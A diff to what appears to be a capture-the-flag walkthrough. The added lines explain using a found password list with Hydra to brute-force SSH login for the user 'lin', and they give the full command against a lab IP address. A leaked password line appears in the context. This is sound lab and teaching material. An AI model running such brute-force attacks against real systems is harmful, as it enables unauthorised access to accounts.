@@ -36,7 +36,11 @@ R3dDRaG0Nsynd1c@T3
 ...
 ```
 
-+ **Let's try to use this password file to connect on the ssh service, using simultanously the user found in the previous task**
++ **Let's try to use this password file to connect on the ssh service, using simultanously the user found in the previous task. The Hydra tool has a brute-force option to crack the login of the ssh service, so we can use it**
+
+``hydra -l lin -P locks.txt 10.10.229.13 -t 4 ssh``
+
+
 
 
 
